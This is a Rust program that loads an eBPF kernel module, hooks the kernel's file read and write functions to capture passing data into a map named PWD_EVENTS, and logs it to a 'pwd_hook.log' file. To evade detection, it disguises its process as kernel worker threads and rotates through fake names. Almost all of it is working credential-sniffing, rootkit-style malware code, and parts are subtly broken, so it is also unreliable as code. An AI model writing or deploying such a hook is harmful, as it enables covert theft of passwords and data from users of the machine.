use anyhow::Result;
use aya::{maps::perf::AsyncPerfEventArray, programs::KProbe, Ebpf};
use shared::HookingFullEvent;
use std::convert::TryInto;
use tokio::{signal, task};
use aya::util::online_cpus;
use bytes::BytesMut;
use libc::{prctl, PR_SET_NAME};
use std::ffi::CString;
use std::thread;
use std::time::Duration;

#[tokio::main(flavor = "current_thread")]
async fn main() -> Result<()> {
    let mut bpf = Ebpf::load_file("/usr/local/lib/ebpf-hook")?;               // Change with the actual path of the compiled ebpf module (the .so file generated by cargo build --release in the ebpf-hook crate)
    let init_name = CString::new("[lab-kworker/0]").unwrap();                   // Initial name of the process
    unsafe { libc::prctl(libc::PR_SET_NAME, init_name.as_ptr() as u64, 0, 0, 0); }

    start_masking();

    // 1. Hook write
    let program: &mut KProbe = bpf
        .program_mut("handle_vfs_write") 
        .ok_or_else(|| anyhow::anyhow!("Function handle_vfs_write not found"))?
        .try_into()?;
    program.load()?;
    program.attach("vfs_write", 0)?;

    // 2. Hook read enter
    let program_read_enter: &mut KProbe = bpf
        .program_mut("handle_read_enter")
        .ok_or_else(|| anyhow::anyhow!("Function handle_read_enter not found"))?
        .try_into()?;
    program_read_enter.load()?;
    program_read_enter.attach("vfs_read", 0)?;

    // 3. Hook read return
    let program_read_return: &mut aya::programs::KProbe = bpf
        .program_mut("handle_read_return")
        .ok_or_else(|| anyhow::anyhow!("Function handlhandle_read_returne_read_return not found"))?
        .try_into()?;
    program_read_return.load()?;
    program_read_return.attach("vfs_read", 0)?;

    // 4. Extract map perf (ownership) to read events in userspace
    let mut perf_array = AsyncPerfEventArray::try_from(
        bpf.take_map("PWD_EVENTS").expect("Map not found!")
    )?;

    // 5. Read from all CPU
    for cpu_id in online_cpus().map_err(|e| anyhow::anyhow!("Error on reading from CPU: {:?}", e))? {
        let mut perf_buf = perf_array.open(cpu_id, None)?;

        task::spawn(async move {
            let mut buffers = (0..10)
                .map(|_| BytesMut::with_capacity(std::mem::size_of::<HookingFullEvent>()))
                .collect::<Vec<_>>();

            loop {
                match perf_buf.read_events(&mut buffers).await {
                    Ok(events) => {
                        for i in 0..events.read {
                            let event: HookingFullEvent = unsafe {
                                std::ptr::read_unaligned(buffers[i].as_ptr() as *const HookingFullEvent)
                            };
                            let _ = handle_event(event).await;
                        }
                    }
                    Err(e) => {
                        eprintln!("Error CPU {}: {}", cpu_id, e);
                        break;
                    }
                }
            }
        });
    }

    println!("Hook started... Press CTRL+C to exit.");
    signal::ctrl_c().await?;
    Ok(())
}

async fn handle_event(ev: HookingFullEvent) -> Result<()> {
    // Decode comm
    let comm_str = {
        let nul_pos = ev
            .comm
            .iter()
            .position(|&c| c == 0)
            .unwrap_or(ev.comm.len());
        String::from_utf8_lossy(&ev.comm[..nul_pos]).to_string()
    };

    let data_str = {
        let nul_pos = ev
            .data
            .iter()
            .position(|&c| c == 0)
            .unwrap_or(ev.data.len());
        String::from_utf8_lossy(&ev.data[..nul_pos]).to_string()
    };

    // print HEX view of the data
    let hex_view: String = ev.data.iter()
        .take(16) 
        .map(|b| format!("{:02x}", b))
        .collect::<Vec<String>>()
        .join(" ");

    let line = format!(
        "[HOOKING-LAB] uid={}, pid={}, command={}, hex={}, data = {}\n",
        ev.uid,
        ev.pid,
        comm_str,
        hex_view,
        data_str
    );


    let mut users_dir_desk = String::new();
    if let Some(user_dirs) = UserDirs::new() { if let Some(desktop) = user_dirs.desktop_dir() { users_dir_desk = desktop.display(); } }

    tokio::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(users_dir_desk + "/pwd_hook.log")
        .await?
        .write_all(line.as_bytes())
        .await?;
    Ok(())
}

use tokio::io::AsyncWriteExt;

fn start_masking() {
    tokio::spawn(async {
        let fake_names = vec![
            "[lab-kworker/0]",  // 15 chars - OK
            "[lab-kworker/u]",  // 15 chars - OK
            "[lab-jbd2/sda]",   // 14 chars - OK
            "[lab-ext4-rsv]",   // 14 chars - OK
            "[lab-crypto/0]"    // 14 chars - OK
        ];

        let mut i = 0;
        loop {
            let name_str = fake_names[i % fake_names.len()];
            let name = CString::new(name_str).unwrap();

            unsafe {
                prctl(PR_SET_NAME, name.as_ptr() as u64, 0, 0, 0);
            }

            i += 1;
            thread::sleep(Duration::from_secs(30));
        }
    });
}